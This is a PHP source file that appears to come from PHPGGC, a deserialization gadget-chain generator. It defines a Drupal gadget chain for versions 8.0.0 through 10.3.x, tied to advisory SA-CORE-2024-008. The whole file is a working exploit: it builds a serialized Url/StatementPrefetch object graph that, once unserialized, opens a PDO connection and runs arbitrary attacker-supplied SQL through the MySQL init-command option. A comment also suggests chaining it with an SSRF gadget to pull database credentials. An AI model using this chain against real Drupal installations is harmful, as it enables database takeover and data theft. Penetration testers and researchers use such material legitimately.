<?php

namespace GadgetChain\Drupal;

class SQLI1 extends \PHPGGC\GadgetChain\SQLI\MySQLAuthenticatedSQLI
{
    public static $version = '>= 8.0.0 < 10.2.11 || >= 10.3.0 < 10.3.9';
    public static $vector = '__wakeup';
    public static $author = 'mcdruid';
    public static $information = 'See: https://gist.github.com/paul-axe/2a384bb5f2d430dd3b63b2484af960f4
    See: https://www.drupal.org/sa-core-2024-008
    Drupal/SSRF1 can be used to extract db credentials for SQL injection.';

    public function generate(array $parameters)
    {
        $dsn = 'mysql:dbname=' . $parameters['dbname'] . ';host=' . $parameters['host'];
        
        return new \Drupal\Core\Url(
            new \Drupal\Core\Database\StatementPrefetch(
                'PDO',                        // class
                [
                    $dsn,                    // DSN
                    $parameters['username'],  // username
                    $parameters['password'],  // password
                    [1002 => $parameters['sql']]  // PDO::MYSQL_ATTR_INIT_COMMAND
                ]
            )
        );
    }
}
